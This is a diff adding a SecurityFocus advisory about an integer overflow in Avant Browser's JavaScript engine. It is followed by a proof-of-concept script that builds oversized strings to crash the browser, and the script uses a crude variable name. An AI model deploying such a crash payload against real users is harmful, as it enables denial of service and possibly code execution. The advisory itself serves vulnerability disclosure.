@@ -1,0 +1,25 @@
+source: http://www.securityfocus.com/bid/31155/info
+
+Avant Browser is prone to an integer-overflow vulnerability that occurs in the JavaScript engine.
+
+An attacker can exploit this issue by enticing an unsuspecting victim to view a malicious site.
+
+Successfully exploiting this issue may allow attackers to crash the affected application, denying service to legitimate users. Given the nature of this issue, attackers may also be able to run arbitrary code, but this has not been confirmed.
+
+Avant Browser 11.7 Build 9 is vulnerable; other versions may also be affected.
+
+NOTE: This vulnerability may be related to the issue described in BID 14917 (Mozilla Browser/Firefox JavaScript Engine Integer Overflow Vulnerability). 
+
+<script>
+var s=String.fromCharCode(257);
+var a=""; var b="";
+for(i=0;i<1024;i++){a=a+s;}
+for(i=0;i<1024;i++){b=b+a;}
+var ov=s;
+for(i=0;i<28;i++) ov += ov;
+for(i=0;i<88;i++) ov += b;
+alert("0x90");
+var Fuck=escape(ov);
+alert("0x90 !");
+alert(Fuck);
+</script>
